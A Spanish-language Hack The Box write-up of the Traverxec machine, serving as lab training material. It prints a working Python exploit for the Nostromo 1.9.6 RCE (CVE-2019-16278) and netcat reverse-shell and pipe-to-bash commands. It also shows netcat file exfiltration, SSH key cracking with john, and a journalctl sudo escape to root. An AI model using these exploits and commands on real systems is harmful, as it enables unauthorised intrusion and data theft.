---
layout: single
title: Traverxec - Hack The Box
excerpt: "Traverxec es una máquina Linux de dificultad fácil en la cual se va a explotar una vulnerabilidad de ejecución de código remoto en el servidor web Nostromo 1.9.6 y para el root, aprovechar que el usuario puede ejecutar journalctl con privilegios."
date: 2020-06-01
classes: wide
header:
  teaser: /assets/images/hack-the-box/traverxec_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - Nostromo
  - SSH
  - Journalctl
---

<p align="center">
<img src="/assets/images/hack-the-box/traverxec_logo.png">
</p>


Traverxec es una máquina Linux de dificultad fácil en la cual se va a explotar una vulnerabilidad de ejecución de código remoto en el servidor web Nostromo 1.9.6 y para el root, aprovechar que el usuario puede ejecutar journalctl con privilegios.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 traverxec.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n traverxec.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nmap -p- --open -T5 -v -n traverxec.htb -oG all-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 23:47 -05

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 108.05 seconds
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p22,80 traverxec.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nmap -sC -sV -p22,80 traverxec.htb -oN targeted.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 23:47 -05

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 26.87 seconds

```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de manera segura.
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.

### Enumeración HTTP

Revisando la página web, encontramos el nombre de `David White` que puede ser valioso en las fases posteriores.

En el output del escaneo con nmap, encontramos que el servidor web que está corriendo se llama `Nostromo` y la versión es la `1.9.6`. Consultando acerca de este servidor, Nostromo también es llamado `nhttpd` que es un servidor HTTP simple y rápido que corre como un único proceso. 


## Explotación

Buscando la versión 1.9.6 de Nostromo, encontramos en  [Exploit-db](https://www.exploit-db.com/exploits/47837) que esta versión es vulnerable a la ejeción de código remoto y corresponde al `CVE-2019-16278`.

El script está escrito en Python y se presenta a continuación

```python
#!/usr/bin/env python

import sys
import socket

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)
   
    except IndexError:
        print(help_menu)
```

Primero, debemos iniciar netcat para tener un listener en el puerto 4444 e iniciar una shell reversa una vez que ejecutemos el script. Para esto, escribimos en la consola `nc -lvp 4444`. 

Ahora, para ejecutar el exploit anterior, escribimos el siguiente comando `python cve-2019-16278.py traverxec.htb 80 "nc 10.10.14.21 4444 -e /bin/sh"`

Una vez ejecutado el comando anterior, ya debemos tener la shell reversa con netcat como se puede observar en el siguiente código

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.21] from traverxec.htb [10.10.10.165] 47300
whoami
www-data
```

Para tener una shell más interactiva y más fácil de navegar dentro del la máquina de nuestro objetivo, usamos el comando `python -c 'import pty; pty.spawn("/bin/bash")'`.

Con el fin de realizar la fase de enumeración de una manera más ágil, descargamos [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) para buscar posibles archivos y directorios donde encontramos información de utilidad.

Para transmitir el contenido del archivo `linpeas.sh` usamos el siguiente comando

```bash
┌─[✗]─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nc -lvnp 9001 < linpeas.sh
listening on [any] 9001 ...
```

Y en la máquina objetivo nos conectamos a nuestra máquina por el puerto establecido anteriormente, en este caso el puerto 9001 

```bash
www-data@traverxec:/tmp$ nc 10.10.14.21 9001 | bash
```

Revisando todo lo que nos arroja `Linpeas` encontramos información relevante en el archivo `nhttpd.conf` y una contraseña en el archivo `.htpasswd`.

```bash
-rw-r--r-- 1 root bin 498 Oct 25  2019 /var/nostromo/conf/nhttpd.conf
Reading /var/nostromo/conf/nhttpd.conf
serveradmin             david@traverxec.htb        
htpasswd                /var/nostromo/conf/.htpasswd 
homedirs                /home
homedirs_public         public_www

-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd
Reading /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Ahora nos dirigimos al directorio `home/david/public_www` y encontramos lo siguiente

```bash
www-data@traverxec:/home/david/public_www$ ls
index.html  protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
```

Procedemos a enviar el archivo `backup-ssh-identity-files.tgz` con netcat a nuestra máquina. 

Para realizar lo anterior, primero iniciamos una sesión en netcat y nos quedamos en modo escucha de la siguiente forma

```bash
┌─[✗]─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]
└──╼ $nc -lvp 9091 > backup-ssh-identity-files.tgz
listening on [any] 9091 ...
```

Y en la máquina que estamos atacando debemos transferir el archivo de la siguiente forma

```bash
www-data@traverxec:/usr/bin$ nc 10.10.14.21 9091 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

Una vez ya tengamos el archivo `backup-ssh-identity-files.tgz` en nuestra máquina, vamos a descomprimirlo para ver su contenido

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]                      
└──╼ $gunzip backup-ssh-identity-files.tgz 
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]        
└──╼ $ls                         
backup-ssh-identity-files.tar  cve-2019-16278.py  linpeas.sh       
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec]         
└──╼ $tar xfv backup-ssh-identity-files.tar                                                   
home/david/.ssh/                 
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa           
home/david/.ssh/id_rsa.pub

```

Procedemos a descifrar la contraseña usando `john` de la siguiente manera

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec/home/david/.ssh]
└──╼ $/usr/share/john/ssh2john.py id_rsa > david.key
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec/home/david/.ssh]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt david.key 
Will run 2 OpenMP threads
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (/home/nicolasmira101/Documents/HTB/Traverxec/home/david/.ssh/id_rsa)

```

Ahora, nos vamos a conectar al usuario david vía SSH

```bash
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Traverxec/home/david/.ssh]
└──╼ $ssh -i id_rsa david@traverxec.htb
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'traverxec.htb,10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

```

Y como observamos en la siguiente consola, ya nos encontramos dentro del sistema y la flag se encuentra en el archivo `user.txt`

```bash
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt 
7db0b4..........................
```




## Escalamiento de privilegios

Después de realizar la enumeración en los directorios disponibles para el usuario, encontramos un archivo que tiene un comando, que el usuario `david` puede ejecutar con privilegios

```bash
david@traverxec:~$ cd bin/
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

El comando que puede ejecutar con privilegios es `journalctl` que en esencia, permite visualizar los archivos del log del sistema. Revisando en la página [GTFOBins](https://gtfobins.github.io/) que contiene una lista de binarios en Unix que pueden ser explotados,  buscamos  `journalctl` y la función `sudo` y ejecutamos el comando `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` y posteriormente escribimos `!/bin/sh` en la consola que se crea y ya obtendremos la flag de root.

```bash
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2020-06-03 00:25:20 EDT, end at Wed 2020-06-03 00:28:39 EDT. --
Jun 03 00:25:24 traverxec systemd[1]: Starting nostromo nhttpd server...
Jun 03 00:25:24 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such f
Jun 03 00:25:24 traverxec nhttpd[457]: started
Jun 03 00:25:25 traverxec nhttpd[457]: max. file descriptors = 1040 (cur) / 1040 (max)
Jun 03 00:25:25 traverxec systemd[1]: Started nostromo nhttpd server.
~
~
~
!/bin/sh
# whoami
root
# cat /root/root.txt
9aa36a........................
```

